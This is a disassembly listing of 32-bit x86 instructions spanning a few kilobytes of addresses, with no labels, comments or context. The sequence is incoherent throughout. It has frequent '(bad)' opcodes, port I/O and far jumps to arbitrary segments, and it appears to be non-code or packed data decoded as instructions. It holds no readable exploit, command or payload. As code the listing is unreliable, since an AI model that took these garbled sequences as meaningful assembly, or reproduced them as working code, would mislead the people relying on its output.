  42063b:	sbb    BYTE PTR [edx+0x4f],ch
  42063e:	stc    
  42063f:	loopne 0x420678
  420641:	scas   eax,DWORD PTR es:[edi]
  420642:	adc    dl,ah
  420644:	pop    ebp
  420645:	fwait
  420646:	popf   
  420647:	inc    esi
  420648:	fild   WORD PTR [ebx+0x9ea9883]
  42064e:	lods   al,BYTE PTR ds:[esi]
  42064f:	jcxz   0x42069d
  420652:	mov    ds:0xb1c41814,eax
  420657:	cld    
  420658:	gs xchg edi,eax
  42065a:	adc    BYTE PTR [edi+0x38],bl
  42065d:	cmp    ah,BYTE PTR [esi-0x16]
  420660:	(bad)  
  420661:	mov    ah,0x61
  420663:	retf   0x6517
  420666:	hlt    
  420667:	fild   DWORD PTR [edx+0x515c16fb]
  42066d:	adc    ah,bh
  42066f:	stos   BYTE PTR es:[edi],al
  420670:	add    ah,BYTE PTR [edx-0x5929124b]
  420676:	call   0x727b:0x82c88f89
  42067d:	push   eax
  42067e:	inc    eax
  42067f:	sahf   
  420680:	pop    edi
  420681:	add    al,0xd4
  420683:	inc    edx
  420684:	mov    bh,0x14
  420686:	adc    eax,0x39ca0076
  42068b:	jp     0x420613
  42068d:	xchg   esi,eax
  42068e:	fild   DWORD PTR [eax]
  420690:	jno    0x420704
  420692:	ins    DWORD PTR es:[edi],dx
  420693:	lds    esi,FWORD PTR [edx+0x4b]
  420696:	jne    0x42067a
  420698:	ja     0x4206b4
  42069a:	mov    eax,ds:0x2ffc9a5c
  42069f:	sub    al,0xa8
  4206a1:	mov    gs,WORD PTR [edi]
  4206a3:	stc    
  4206a4:	ret    
  4206a5:	mov    edi,0x60ceb24c
  4206aa:	repnz mov dl,0x26
  4206ad:	sbb    al,0x41
  4206af:	sbb    BYTE PTR [esi+esi*4-0x1b],al
  4206b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206b4:	into   
  4206b5:	ss push ebx
  4206b7:	das    
  4206b8:	retf   
  4206b9:	jg     0x420686
  4206bb:	add    edi,DWORD PTR [ecx+0x61dd4682]
  4206c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206c2:	jle    0x4206c8
  4206c4:	jae    0x4206e4
  4206c6:	call   0x8ee383f3
  4206cb:	imul   esi,DWORD PTR ds:0x6c43926b,0xffffff81
  4206d2:	push   ecx
  4206d3:	jp     0x4206d2
  4206d5:	cmp    BYTE PTR [eax+0x16],al
  4206d8:	mov    ds,ebx
  4206da:	jbe    0x420726
  4206dc:	sub    bh,bl
  4206de:	sti    
  4206df:	cmp    ah,BYTE PTR [edi]
  4206e1:	xor    eax,0x817885da
  4206e6:	xchg   ch,ah
  4206e8:	mov    esp,0x346ff16e
  4206ed:	mov    edx,0xbbf72a13
  4206f2:	mov    ebp,edi
  4206f4:	xor    eax,0x2b048407
  4206f9:	xor    eax,0xe32762de
  4206fe:	test   eax,0xfc394298
  420704:	sub    DWORD PTR [ecx+0x6a],edi
  420707:	fcmovnbe st,st(6)
  420709:	inc    eax
  42070a:	pop    esi
  42070b:	add    DWORD PTR [edx-0x1c47ddf2],ecx
  420711:	jne    0x4206d2
  420713:	and    dh,BYTE PTR [edx]
  420715:	xor    ebp,DWORD PTR [eax-0x38a4068a]
  42071b:	cs retf 
  42071d:	shr    BYTE PTR [esi],1
  42071f:	pop    ecx
  420720:	push   ecx
  420721:	popa   
  420722:	mov    ecx,0xa0a989ac
  420727:	mov    esp,0x73f1310a
  42072c:	pop    bp
  42072e:	jmp    0x7cb32af
  420733:	loope  0x4206fe
  420735:	pop    edx
  420736:	xor    BYTE PTR [edi-0xd],bl
  420739:	fsubr  DWORD PTR [ecx]
  42073b:	cmp    BYTE PTR [ebp+0x51],ch
  42073e:	pop    eax
  42073f:	or     eax,0xc33473e1
  420744:	data16 mov BYTE PTR [edi+0x66],cl
  420748:	ds retf 
  42074a:	mov    ah,0xa1
  42074c:	lods   eax,DWORD PTR ds:[esi]
  42074d:	(bad)  
  42074f:	jecxz  0x42078c
  420751:	adc    eax,0xd6f7d10e
  420756:	dec    ebx
  420757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420758:	(bad)  
  420759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42075a:	(bad)  
  42075b:	in     al,dx
  42075c:	scas   al,BYTE PTR es:[edi]
  42075d:	arpl   bx,ax
  42075f:	ds into 
  420761:	leave  
  420762:	push   eax
  420763:	in     al,dx
  420764:	mov    esp,0xc4b707f7
  420769:	lods   eax,DWORD PTR ds:[esi]
  42076a:	es xchg ebp,eax
  42076c:	and    al,0xf8
  42076e:	mov    bh,0xa9
  420770:	mov    ch,0xa6
  420772:	mov    DWORD PTR [ecx+ecx*4+0x6c],edi
  420776:	mov    dh,0xff
  420778:	jb     0x4207cc
  42077a:	retf   
  42077b:	(bad)  
  42077c:	imul   ecx,DWORD PTR [ebp-0x1e7b8526],0xffffff94
  420783:	push   esi
  420784:	xlat   BYTE PTR ds:[ebx]
  420785:	sub    DWORD PTR [eax],ebp
  420787:	int    0xc4
  420789:	mov    bh,BYTE PTR [ebx+0x43]
  42078c:	sbb    al,0xdc
  42078e:	add    ecx,DWORD PTR [ebx]
  420790:	dec    edi
  420791:	sbb    ah,BYTE PTR [ebp-0x7f]
  420794:	push   0x652d1653
  420799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42079a:	sbb    ebp,edi
  42079c:	cmp    esp,0xe5c98e83
  4207a2:	jo     0x4207fa
  4207a4:	ins    DWORD PTR es:[edi],dx
  4207a5:	and    DWORD PTR [eax-0x74d92a52],0x4e3973a7
  4207af:	lods   al,BYTE PTR ds:[esi]
  4207b0:	sub    al,0x58
  4207b2:	dec    ebx
  4207b3:	and    esp,DWORD PTR [eax-0x5059badf]
  4207b9:	pop    ebx
  4207ba:	shl    ebx,1
  4207bc:	pop    es
  4207bd:	hlt    
  4207be:	shr    BYTE PTR [edx+ebx*1-0x5b],0x1d
  4207c3:	jl     0x420815
  4207c5:	inc    edi
  4207c6:	pop    edx
  4207c7:	repz test BYTE PTR [esi-0x35],0x1c
  4207cc:	mov    ch,0x20
  4207ce:	add    eax,0xf68f118b
  4207d3:	mov    ch,0x56
  4207d5:	js     0x42080b
  4207d7:	mov    bl,0x87
  4207d9:	cdq    
  4207da:	hlt    
  4207db:	ins    BYTE PTR es:[edi],dx
  4207dc:	ret    0x98d8
  4207df:	jmp    0x42085a
  4207e1:	or     al,0xf8
  4207e3:	rcr    DWORD PTR [ecx],0x1b
  4207e6:	(bad)  
  4207e8:	sub    ch,0xd
  4207eb:	lea    ebp,[ebp+0x34e70098]
  4207f1:	inc    ecx
  4207f2:	daa    
  4207f3:	pop    ecx
  4207f4:	mov    bl,0x7b
  4207f6:	dec    edi
  4207f7:	xor    DWORD PTR [ebx+eax*4+0x3330a777],0x13
  4207ff:	inc    esp
  420800:	xchg   BYTE PTR [edx+0x52b37127],al
  420806:	sub    DWORD PTR [ecx+0x4d],eax
  420809:	rcr    DWORD PTR [eax-0x2c0644bc],cl
  42080f:	mov    dl,0x61
  420811:	xchg   ebx,eax
  420812:	ja     0x42086e
  420814:	push   ebx
  420815:	lock (bad) 
  420817:	stc    
  420818:	dec    eax
  420819:	int    0x19
  42081b:	jns    0x420885
  42081d:	arpl   WORD PTR [eax],dx
  42081f:	mov    DWORD PTR [ecx-0x555f4ac5],ebp
  420825:	cmp    BYTE PTR [ecx],al
  420827:	sub    al,0xd6
  420829:	loopne 0x4207e2
  42082b:	loope  0x42085c
  42082d:	push   esp
  42082e:	mov    ?,ecx
  420830:	push   ss
  420831:	clc    
  420832:	mov    ch,0x90
  420834:	stos   BYTE PTR es:[edi],al
  420835:	inc    esi
  420836:	push   esi
  420837:	sbb    eax,0x7d9871c6
  42083c:	xor    edx,DWORD PTR ds:0xf07c7f68
  420842:	test   eax,0xe9c0b6e9
  420847:	push   es
  420848:	loope  0x420884
  42084a:	out    0x68,al
  42084c:	retf   0xa845
  42084f:	inc    edi
  420850:	push   cs
  420851:	cmc    
  420852:	popa   
  420853:	(bad)  
  420854:	sbb    dl,BYTE PTR [eax+0x75]
  420857:	add    eax,0x1c29c9e1
  42085c:	or     DWORD PTR ds:0x10aa424f,eax
  420862:	pop    esp
  420863:	in     eax,0x51
  420865:	xchg   al,bl
  420867:	dec    edi
  420868:	cs out 0x6,al
  42086b:	mov    dh,BYTE PTR [edi+0x18]
  42086e:	inc    edx
  42086f:	push   ebp
  420870:	push   es
  420871:	add    edx,DWORD PTR [edx]
  420873:	mov    ebx,cs
  420875:	imul   dh
  420877:	xchg   edx,eax
  420878:	mov    eax,ds:0xd51efb00
  42087d:	dec    esp
  42087e:	pushf  
  42087f:	mov    esp,0x66496d47
  420884:	shl    BYTE PTR [esi],cl
  420886:	retf   0x7acd
  420889:	(bad)  
  42088b:	jne    0x4208b2
  42088d:	in     eax,dx
  42088e:	xchg   ebp,eax
  42088f:	sub    bh,BYTE PTR [edx]
  420891:	mov    cl,0x4e
  420893:	pop    edi
  420894:	lock repnz loop 0x42087d
  420898:	mov    esi,0xe4954f23
  42089d:	inc    esp
  42089e:	imul   ebx,edi,0xc0668a4c
  4208a4:	and    ch,0x50
  4208a7:	int    0x38
  4208a9:	jge    0x4208a8
  4208ab:	fistp  QWORD PTR [eax-0x65]
  4208ae:	xchg   ebp,eax
  4208af:	mov    bh,al
  4208b1:	adc    DWORD PTR [esp+edx*8],edi
  4208b4:	cld    
  4208b5:	rcl    DWORD PTR [edi+0x22],1
  4208b8:	jo     0x4208f9
  4208ba:	cmp    BYTE PTR [ecx+ecx*1],al
  4208bd:	repz pop ds
  4208bf:	test   al,0x5a
  4208c1:	jo     0x4208e5
  4208c3:	mov    eax,ds:0xf746708f
  4208c8:	fisttp WORD PTR [eiz*2-0x53fac180]
  4208cf:	dec    ebx
  4208d0:	adc    cl,BYTE PTR [esi]
  4208d2:	xchg   edi,eax
  4208d3:	in     al,0xbb
  4208d5:	aad    0x4e
  4208d7:	stos   DWORD PTR es:[edi],eax
  4208d8:	lods   al,BYTE PTR ds:[esi]
  4208d9:	mov    esp,0xb9560d5e
  4208de:	xor    ebx,DWORD PTR [esi]
  4208e0:	ret    
  4208e1:	retf   0x361e
  4208e4:	sbb    BYTE PTR ds:0xaaff9065,dl
  4208ea:	outs   dx,DWORD PTR ds:[esi]
  4208eb:	or     eax,eax
  4208ed:	shl    ch,cl
  4208ef:	(bad)  
  4208f0:	daa    
  4208f1:	adc    esi,DWORD PTR [edx]
  4208f3:	xchg   BYTE PTR [eax+0x15],al
  4208f6:	hlt    
  4208f7:	fcmovbe st,st(6)
  4208f9:	imul   ecx,DWORD PTR [ebp-0x399a9730],0x86fd8014
  420903:	bound  eax,QWORD PTR [ebx]
  420905:	sti    
  420906:	push   eax
  420907:	jae    0x42089e
  420909:	mov    esi,0xd7eafa55
  42090e:	aam    0x19
  420910:	or     ecx,DWORD PTR [ebp+0x55463d38]
  420916:	test   DWORD PTR [edi],eax
  420918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420919:	add    DWORD PTR [eax+0xa489d47],eax
  42091f:	ins    DWORD PTR es:[edi],dx
  420920:	hlt    
  420921:	cmp    DWORD PTR [esi],ebx
  420923:	xor    al,0x73
  420925:	xor    ebp,esp
  420927:	and    eax,0xb864f5f3
  42092c:	and    al,0x2b
  42092e:	adc    BYTE PTR [esi+0x72],al
  420931:	push   cs
  420932:	xor    esp,DWORD PTR [edx]
  420934:	mov    cl,0x7f
  420936:	idiv   dl
  420938:	inc    ebp
  420939:	aas    
  42093a:	dec    edx
  42093b:	push   cs
  42093c:	call   0xbcc7:0x5194ce61
  420943:	mov    ds:0x6b7da10,eax
  420948:	cmp    ebx,DWORD PTR [edx-0x80]
  42094b:	rol    BYTE PTR [edx],cl
  42094d:	lahf   
  42094e:	aad    0x5a
  420950:	aas    
  420951:	mov    ebx,DWORD PTR [eax-0x7c266d8d]
  420957:	inc    ebx
  420958:	cmp    BYTE PTR [ebx-0x354b767f],ch
  42095e:	and    BYTE PTR [ebp+0x96ce109],0x2b
  420965:	out    dx,eax
  420966:	mov    eax,0xb5318cd8
  42096b:	sbb    DWORD PTR [edi+0x63a9c477],ebx
  420971:	mov    al,0xb1
  420973:	add    eax,0x2550570b
  420978:	add    DWORD PTR [edi+0x22],ecx
  42097b:	mov    edi,0x29d3d22a
  420980:	lods   al,BYTE PTR ds:[esi]
  420981:	sub    bl,bl
  420983:	retf   0x1a7c
  420986:	sbb    BYTE PTR [edi+ecx*4+0x13],dh
  42098a:	fmul   DWORD PTR ds:0x2d997af0
  420990:	loopne 0x420951
  420992:	fimul  WORD PTR [eax-0x402de4e9]
  420998:	fistp  WORD PTR [edi+ebx*2+0x65]
  42099c:	rep stos BYTE PTR es:[edi],al
  42099e:	jne    0x420a15
  4209a0:	mov    ds:0x18a248bb,eax
  4209a5:	sbb    eax,0x2ce858aa
  4209aa:	data16 xor ch,BYTE PTR [ebx+0x2e]
  4209ae:	aaa    
  4209af:	mov    ecx,0x5c0af2e3
  4209b4:	add    eax,0xbebe7a05
  4209b9:	mov    DWORD PTR [edi-0xe],edx
  4209bc:	mov    dh,0x47
  4209be:	jle    0x420979
  4209c0:	jae    0x420997
  4209c2:	jg     0x42095f
  4209c4:	jns    0x420a12
  4209c6:	xchg   esi,eax
  4209c7:	in     al,0xa8
  4209c9:	cmc    
  4209ca:	out    dx,eax
  4209cb:	inc    esp
  4209cc:	aaa    
  4209cd:	and    eax,0xffffffbe
  4209d0:	(bad)  
  4209d1:	(bad)  
  4209d2:	je     0x420979
  4209d4:	ror    DWORD PTR [ebx-0x61],1
  4209d7:	dec    edx
  4209d8:	enter  0xcb91,0x6a
  4209dc:	xchg   BYTE PTR ds:0x9d2ff583,cl
  4209e2:	cmc    
  4209e3:	scas   al,BYTE PTR es:[edi]
  4209e4:	inc    esi
  4209e5:	pop    ebx
  4209e6:	push   ebx
  4209e7:	push   ebp
  4209e8:	jmp    0xe90a:0x123bf64
  4209ef:	sbb    al,0x97
  4209f1:	in     eax,dx
  4209f2:	xchg   edi,eax
  4209f3:	ss retf 
  4209f5:	jp     0x420a5b
  4209f7:	sbb    edi,DWORD PTR [ebx]
  4209f9:	push   cs
  4209fa:	xor    ebx,edx
  4209fc:	scas   eax,DWORD PTR es:[edi]
  4209fd:	or     esi,0xdf5d12b8
  420a03:	pop    edx
  420a04:	push   ss
  420a05:	xchg   edi,eax
  420a06:	push   0x0
  420a08:	jb     0x420a39
  420a0a:	add    al,0x2f
  420a0c:	cs jnp 0x420a5c
  420a0f:	cmp    cl,BYTE PTR [esp+ecx*1]
  420a12:	cdq    
  420a13:	shl    DWORD PTR [edi+0x3a],1
  420a16:	sub    bh,BYTE PTR [ebx-0x72f0be84]
  420a1c:	js     0x4209b3
  420a1e:	and    BYTE PTR [edx-0x6b85025],0x6b
  420a25:	xor    eax,DWORD PTR [esi]
  420a27:	mov    eax,ds:0x14bfa757
  420a2c:	in     eax,0xc8
  420a2e:	dec    esi
  420a2f:	sub    edi,DWORD PTR [ebx+ebp*1+0xf89f502]
  420a36:	cdq    
  420a37:	mov    al,0x7e
  420a39:	push   esi
  420a3a:	ret    0xca6
  420a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a3e:	not    ebx
  420a40:	adc    ebx,esp
  420a42:	mov    edi,0xc8753f08
  420a47:	xchg   BYTE PTR [edx-0x110d3239],al
  420a4d:	push   ebp
  420a4e:	add    edx,esi
  420a50:	aaa    
  420a51:	(bad)  
  420a52:	inc    esi
  420a53:	xlat   BYTE PTR ds:[ebx]
  420a54:	adc    ebx,edi
  420a56:	mov    BYTE PTR [edx-0x30],dl
  420a59:	pop    esp
  420a5a:	and    ebx,esi
  420a5c:	push   es
  420a5d:	loope  0x420a50
  420a5f:	inc    ebx
  420a60:	mov    DWORD PTR [esi+ebx*4],edx
  420a63:	dec    ecx
  420a64:	cli    
  420a65:	std    
  420a66:	pusha  
  420a67:	mov    cl,0xad
  420a69:	fldenv [edx-0x46b8b8d8]
  420a6f:	inc    eax
  420a70:	repz cmp al,0xe0
  420a73:	xchg   BYTE PTR ds:0x43165d36,dh
  420a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a7a:	and    DWORD PTR [eax+0x74],esi
  420a7d:	imul   edx,DWORD PTR [ebx+0x3c],0x48230b4b
  420a84:	jecxz  0x420a41
  420a86:	push   edi
  420a87:	or     al,0x61
  420a89:	mov    ah,BYTE PTR [ebp-0x3f49bfdb]
  420a8f:	cmp    edi,DWORD PTR [eax+0x17]
  420a92:	or     cl,bh
  420a94:	xchg   esp,eax
  420a95:	sbb    edx,edx
  420a97:	es fs test al,0xc3
  420a9b:	pop    edi
  420a9c:	jne    0x420a55
  420a9e:	inc    ebx
  420a9f:	lods   eax,DWORD PTR ds:[esi]
  420aa0:	sbb    eax,0x5a830597
  420aa5:	jmp    0xe006:0x1d6cb819
  420aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420aad:	mov    al,BYTE PTR [ecx-0x68]
  420ab0:	adc    dl,BYTE PTR [edi]
  420ab2:	clc    
  420ab3:	mov    al,ds:0x809c3c72
  420ab8:	cli    
  420ab9:	mov    ebx,0xcdf170f6
  420abe:	jae    0x420a43
  420ac0:	test   BYTE PTR [bx+0x44],dl
  420ac4:	xchg   esi,edi
  420ac6:	in     eax,dx
  420ac7:	icebp  
  420ac8:	fcomp  st(4)
  420aca:	(bad)  
  420acb:	or     al,0x1
  420acd:	(bad)  
  420ace:	push   edx
  420acf:	fstp   TBYTE PTR [ebx+eax*4+0x320af3f7]
  420ad6:	es mov ah,bh
  420ad9:	or     eax,0x6606e263
  420ade:	test   cl,bl
  420ae0:	dec    esi
  420ae1:	(bad)  
  420ae2:	jmp    0xba2c:0x3960070e
  420ae9:	retf   0x5c56
  420aec:	mov    al,ds:0x8392a942
  420af1:	lock pop ss
  420af3:	xor    BYTE PTR [ecx+0x27eb4625],ch
  420af9:	sbb    eax,0x1f710945
  420afe:	xchg   edi,eax
  420aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b00:	fnstcw WORD PTR [eax-0x4a]
  420b03:	cli    
  420b04:	xchg   edx,eax
  420b05:	or     dl,BYTE PTR [ecx+0x6080b468]
  420b0b:	dec    ebp
  420b0c:	sbb    DWORD PTR [ebx],0xa882f73d
  420b12:	fist   DWORD PTR [esi-0x33]
  420b15:	and    DWORD PTR [ebp+esi*2+0x65eeb5ca],esp
  420b1c:	inc    edx
  420b1d:	mov    esi,0x70e95cb6
  420b22:	iret   
  420b23:	(bad)  
  420b24:	jns    0x420b24
  420b26:	xchg   esi,eax
  420b27:	icebp  
  420b28:	icebp  
  420b29:	jbe    0x420b37
  420b2b:	scas   al,BYTE PTR es:[edi]
  420b2c:	cmp    ecx,DWORD PTR [edx-0x12]
  420b2f:	and    eax,0xa447026d
  420b34:	mov    BYTE PTR [eax-0x3f05286e],bl
  420b3a:	push   esi
  420b3b:	pop    esi
  420b3c:	sub    al,BYTE PTR [esi-0x69]
  420b3f:	mov    edx,0x59b40520
  420b44:	xor    eax,DWORD PTR [ebx+0x5ba8772f]
  420b4a:	sub    esp,DWORD PTR [edi+0x6b]
  420b4d:	sub    eax,0x38edeb3c
  420b52:	nop
  420b53:	pop    ds
  420b54:	cs daa 
  420b56:	lahf   
  420b57:	popa   
  420b58:	xchg   ecx,eax
  420b59:	mov    ebp,0x1ad4a9fa
  420b5e:	aaa    
  420b5f:	push   edi
  420b60:	xor    al,0x59
  420b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b63:	mov    bl,0x9b
  420b65:	das    
  420b66:	stos   BYTE PTR es:[edi],al
  420b67:	jecxz  0x420b7b
  420b69:	jb     0x420b14
  420b6b:	(bad)  
  420b6c:	ror    DWORD PTR [esi-0x55443fb1],1
  420b72:	jle    0x420b4d
  420b74:	fimul  DWORD PTR [eax]
  420b76:	cmc    
  420b77:	add    BYTE PTR [edx+0x7ce8e626],dl
  420b7d:	es (bad) 
  420b7f:	mov    esi,0x60de5712
  420b84:	add    al,BYTE PTR [edi-0x579e6f09]
  420b8a:	lahf   
  420b8b:	rcl    DWORD PTR [ebx+eax*4+0x90cb182],cl
  420b92:	mov    ds:0x7f9e2877,eax
  420b97:	fcom   QWORD PTR [edx-0x36]
  420b9a:	stos   BYTE PTR es:[edi],al
  420b9b:	push   ebp
  420b9c:	push   ss
  420b9d:	sbb    DWORD PTR [edi-0x6],esi
  420ba0:	push   ebp
  420ba1:	(bad)  
  420ba2:	cmp    ecx,DWORD PTR ds:0xa2084c2b
  420ba8:	push   0x31
  420baa:	in     eax,0x84
  420bac:	mov    eax,DWORD PTR [ebx+ebp*1]
  420baf:	mov    ebx,0x42748776
  420bb4:	fsub   QWORD PTR [ecx]
  420bb6:	int    0x2
  420bb8:	pop    edi
  420bb9:	fwait
  420bba:	jl     0x420c1f
  420bbc:	fimul  WORD PTR [ebp-0x63]
  420bbf:	jo     0x420c3c
  420bc1:	xlat   BYTE PTR ds:[ebx]
  420bc2:	daa    
  420bc3:	dec    edx
  420bc4:	inc    edi
  420bc5:	inc    ebp
  420bc6:	mov    es,ebx
  420bc8:	stos   DWORD PTR es:[edi],eax
  420bc9:	adc    al,0x4f
  420bcb:	jne    0x420b72
  420bcd:	scas   al,BYTE PTR es:[edi]
  420bce:	in     eax,dx
  420bcf:	daa    
  420bd0:	scas   al,BYTE PTR es:[edi]
  420bd1:	aam    0xec
  420bd3:	hlt    
  420bd4:	cmp    edi,ebx
  420bd6:	lock popf 
  420bd8:	jg     0x420b64
  420bda:	mov    eax,0xbd18e4d0
  420bdf:	dec    edx
  420be0:	mov    ecx,DWORD PTR [ecx]
  420be2:	add    al,0x7d
  420be4:	jmp    0x2fa7:0x941f4b46
  420beb:	lock add BYTE PTR [eax-0x4737b661],bl
  420bf2:	mov    bl,0x2d
  420bf4:	or     eax,0xf6ffb57
  420bf9:	icebp  
  420bfa:	ss fcomip st,st(7)
  420bfd:	fsubr  QWORD PTR [esp+esi*1-0x25]
  420c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c02:	icebp  
  420c03:	sub    eax,0x8b21bfa8
  420c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c09:	jecxz  0x420be1
  420c0b:	mov    edx,0xb6069f89
  420c10:	rol    BYTE PTR [esi],cl
  420c12:	ret    
  420c13:	das    
  420c14:	and    DWORD PTR [esi],edx
  420c16:	xor    al,0x6d
  420c18:	clc    
  420c19:	lock sub dl,BYTE PTR [edx-0x6e784f5e]
  420c20:	call   0xa7f31ea6
  420c25:	sbb    esi,DWORD PTR [ecx+ebx*2+0xe37bcfc]
  420c2c:	pop    ss
  420c2d:	mov    ds:0x66b2caab,eax
  420c32:	add    ebp,DWORD PTR [ecx]
  420c34:	push   cs
  420c35:	sbb    ebx,DWORD PTR [ecx+0x5166f8e8]
  420c3b:	adc    eax,0xbd49e7c8
  420c40:	out    dx,al
  420c41:	cmp    al,0xd5
  420c43:	fld    TBYTE PTR [esi-0x4c04cb41]
  420c49:	xchg   ebp,eax
  420c4a:	or     bh,bl
  420c4c:	push   esi
  420c4d:	mov    ds:0x17cc8ede,eax
  420c52:	adc    ebx,DWORD PTR [edi+ebp*8]
  420c55:	les    esi,FWORD PTR [edi+esi*2]
  420c58:	push   ebp
  420c59:	das    
  420c5a:	outs   dx,DWORD PTR ds:[esi]
  420c5b:	repnz and bh,BYTE PTR [ecx-0x5017a47b]
  420c62:	sbb    BYTE PTR [ecx+0x2d],cl
  420c65:	mov    cl,BYTE PTR [esi+0x1097a646]
  420c6b:	stos   BYTE PTR es:[edi],al
  420c6c:	or     eax,0x41b2a232
  420c71:	les    ecx,FWORD PTR [esi-0x25849d66]
  420c77:	add    esp,ebx
  420c79:	jge    0x420ccc
  420c7b:	call   0xf310:0x163b4653
  420c82:	or     al,0xda
  420c84:	jne    0x420cc6
  420c86:	sbb    eax,0x49acea3c
  420c8b:	repnz loop 0x420c8f
  420c8e:	cmp    al,0xad
  420c90:	dec    esp
  420c91:	push   esi
  420c92:	or     BYTE PTR [eax-0x492f17f2],al
  420c98:	out    0xb2,al
  420c9a:	push   edi
  420c9b:	jecxz  0x420c31
  420c9d:	jmp    0xfb04:0x39a6b5f1
  420ca4:	or     al,0x8a
  420ca6:	cmp    al,0x40
  420ca8:	xchg   esp,eax
  420ca9:	addr16 cmp al,0x69
  420cac:	jg     0x420ce9
  420cae:	sar    DWORD PTR [edx],1
  420cb0:	jb     0x420d13
  420cb2:	sub    edx,esi
  420cb4:	add    DWORD PTR [ebp-0x2a],edx
  420cb7:	pop    ebx
  420cb8:	mov    dl,0xd2
  420cba:	retf   
  420cbb:	rol    DWORD PTR [eax+0x60a7148c],0xc9
  420cc2:	aad    0x17
  420cc4:	jge    0x420c52
  420cc6:	dec    ebx
  420cc7:	jnp    0x420cd0
  420cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cca:	dec    ebp
  420ccb:	je     0x420cf8
  420ccd:	xchg   ecx,eax
  420cce:	dec    edi
  420ccf:	and    al,0xf3
  420cd1:	xor    eax,0x11e0386e
  420cd6:	test   al,0x9e
  420cd8:	mov    ds:0xf278896d,al
  420cdd:	add    al,0xc1
  420cdf:	test   eax,0x437c53d
  420ce4:	cwde   
  420ce5:	mov    ch,BYTE PTR [eax-0x24edcb7a]
  420ceb:	xlat   BYTE PTR ds:[ebx]
  420cec:	arpl   WORD PTR [esi-0x2d157d25],si
  420cf2:	iret   
  420cf3:	mov    esi,0xc0024e12
  420cf8:	out    dx,al
  420cf9:	push   esp
  420cfa:	sub    bl,BYTE PTR [ecx]
  420cfc:	add    DWORD PTR [edx+0xe9980b4],ebx
  420d02:	sbb    eax,0xc1075461
  420d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d08:	or     eax,0x5ee16d08
  420d0d:	jecxz  0x420d07
  420d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d10:	jns    0x420cf2
  420d12:	das    
  420d13:	psadbw mm0,QWORD PTR [ecx]
  420d16:	cld    
  420d17:	test   al,0x7
  420d19:	sar    al,1
  420d1b:	popa   
  420d1c:	jo     0x420d23
  420d1e:	dec    ebx
  420d1f:	mov    dh,0xab
  420d21:	add    al,0xf
  420d23:	cld    
  420d24:	in     al,0x16
  420d26:	sub    ebx,ecx
  420d28:	rol    BYTE PTR [ebx-0x7e3776fd],cl
  420d2e:	mov    bh,0xc1
  420d30:	mov    eax,0xe10761c5
  420d35:	adc    al,BYTE PTR [eax+0x987bf]
  420d3b:	adc    DWORD PTR [edi+0x3c],0xffffffcf
  420d3f:	std    
  420d40:	xchg   ebx,eax
  420d41:	sti    
  420d42:	gs aas 
  420d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d45:	mov    ebx,0x3a7b1f49
  420d4a:	sub    ebp,DWORD PTR [esp+ebp*2]
  420d4d:	test   al,0x37
  420d4f:	mov    dh,0xea
  420d51:	mov    eax,0x3d20d1f7
  420d56:	mov    ch,0xbb
  420d58:	retf   0xaa0b
  420d5b:	jmp    DWORD PTR [ebp+0x45]
  420d5e:	(bad)  
  420d5f:	hlt    
  420d60:	jnp    0x420dcb
  420d62:	shr    BYTE PTR fs:[edx-0x22],0xd6
  420d67:	aad    0x5d
  420d69:	jns    0x420de7
  420d6b:	dec    esi
  420d6c:	push   ecx
  420d6d:	(bad)  
  420d6e:	shr    BYTE PTR [edi+esi*2-0x444a3810],cl
  420d75:	mov    bl,0xd6
  420d77:	inc    esi
  420d78:	scas   al,BYTE PTR es:[edi]
  420d79:	sbb    eax,0x35f324b8
  420d7e:	ss in  eax,dx
  420d80:	call   0xf1daf4fe
  420d85:	loopne 0x420d47
  420d87:	call   FWORD PTR [eax]
  420d89:	cwde   
  420d8a:	pop    es
  420d8b:	xchg   ecx,eax
  420d8c:	mov    ah,0x63
  420d8e:	or     al,0x8b
  420d90:	fistp  DWORD PTR ds:0xca6a7df0
  420d96:	or     al,0xb
  420d98:	and    edi,DWORD PTR [eax+ebp*1-0x10884804]
  420d9f:	pop    eax
  420da0:	stos   DWORD PTR es:[edi],eax
  420da1:	aas    
  420da2:	loope  0x420d80
  420da4:	es cwde 
  420da6:	repz fcmove st,st(5)
  420da9:	adc    al,0x97
  420dab:	add    DWORD PTR [edx+edx*4-0x22],ebp
  420daf:	push   esp
  420db0:	ins    DWORD PTR es:[edi],dx
  420db1:	xchg   BYTE PTR [ebx+ebp*8-0x60],dh
  420db5:	mov    ecx,0x33f16b4a
  420dba:	ret    0xd3f0
  420dbd:	add    BYTE PTR [esi],0x56
  420dc0:	pop    eax
  420dc1:	inc    edi
  420dc2:	hlt    
  420dc3:	stos   DWORD PTR es:[edi],eax
  420dc4:	mov    esi,esp
  420dc6:	and    dl,BYTE PTR [eax]
  420dc8:	ins    DWORD PTR es:[edi],dx
  420dc9:	adc    bl,dh
  420dcb:	in     eax,0x57
  420dcd:	pop    eax
  420dce:	retf   0x1916
  420dd1:	ss sti 
  420dd3:	cmp    ah,BYTE PTR [ecx+ecx*8]
  420dd6:	mov    DWORD PTR [edi],ebp
  420dd8:	daa    
  420dd9:	jbe    0x420de3
  420ddb:	add    DWORD PTR [edx-0x44],esp
  420dde:	mov    ds,WORD PTR [edi+0x6b8f6abe]
  420de4:	sub    bh,bl
  420de6:	jb     0x420e0e
  420de8:	test   esi,ebx
  420dea:	inc    edx
  420deb:	jmp    0xa8ee:0xde13965e
  420df2:	sub    edx,edi
  420df4:	imul   edx,DWORD PTR [eax-0x28],0xffffff9d
  420df8:	dec    esp
